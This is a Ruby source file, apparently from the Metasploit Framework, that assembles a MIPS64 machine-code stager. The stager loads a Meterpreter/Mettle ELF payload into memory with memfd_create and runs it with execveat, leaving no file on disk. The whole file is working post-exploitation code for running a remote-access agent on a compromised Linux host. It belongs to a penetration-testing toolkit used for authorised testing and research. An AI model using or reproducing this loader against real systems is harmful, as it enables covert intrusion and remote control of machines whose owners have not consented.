#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Diego Ledda <diego_ledda[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
#  MIPS64 conventions
#  Literal Zero: r0/$zero
#  Volatile: t0-t7
#  Parameters: a0-a3
#  Syscall offset: v0
#  Return Address: ra

module Msf::Payload::Linux::Mips64::MeterpreterLoader
  def in_memory_load(payload)
    size = payload.length
    size_h = size >> 16
    size_l = size & 0x0000ffff
    in_memory_loader = [
      # "call" 0x1004, address of the next instruction is stored in $ra
      0x04110000, # 0x1000:	bal	0x1004	0x04110000
      0x00000000, # 0x1004:	nop		0x00000000

      # fd = memfd_create(NULL,MFD_CLOEXEC)
      0x03e02025, # 0x1008:	move	$a0, $ra	0x03e02025
      0x27ff005c, # 0x100c:	addiu	$ra, $ra, 0x5c	0x27ff005c
      0x2419fffe, # 0x1010:	addiu	$t9, $zero, -2	0x2419fffe
      0x03202827, # 0x1014:	not	$a1, $t9	0x03202827
      0x240214c2, # 0x1018:	addiu	$v0, $zero, 0x14c2	0x240214c2
      0x0101010c, # 0x101c:	syscall	0x40404	0x0101010c

      # write(fd, payload length, payload pointer)
      0x03e02825, # 0x1020:	move	$a1, $ra	0x03e02825
      (0x3c06 << 16 | size_h),  #   lui     a2,0x17
      (0x34c6 << 16 | size_l),  #   ori     a2,a2,0x2fb8
      0x00402025, # 0x102c:	move	$a0, $v0	0x00402025
      0x0080c825, # 0x1030:	move	$t9, $a0	0x0080c825
      0x24021389, # 0x1034:	addiu	$v0, $zero, 0x1389	0x24021389
      0x0101010c, # 0x1038:	syscall	0x40404	0x0101010c

      # execveat(fd, null,null,null, AT_EMPTY_PATH)
      0x03202025, # 0x103c:	move	$a0, $t9	0x03202025
      0xafa0fffc, # 0x1040:	sw	$zero, -4($sp)	0xafa0fffc
      0x27bdfffc, # 0x1044:	addiu	$sp, $sp, -4	0x27bdfffc
      0x03a02820, # 0x1048:	add	$a1, $sp, $zero	0x03a02820
      0x00003025, # 0x104c:	move	$a2, $zero	0x00003025
      0x00003825, # 0x1050:	move	$a3, $zero	0x00003825
      0x24191000, # 0x1054:	addiu	$t9, $zero, 0x1000	0x24191000
      0xafb90010, # 0x1058:	sw	$t9, 0x10($sp)	0xafb90010
      0x240214c4, # 0x105c:	addiu	$v0, $zero, 0x14c4	0x240214c4
      0x0101010c  # 0x1060:	syscall	0x40404	0x0101010c
    ].pack('N*')
    in_memory_loader
  end
end
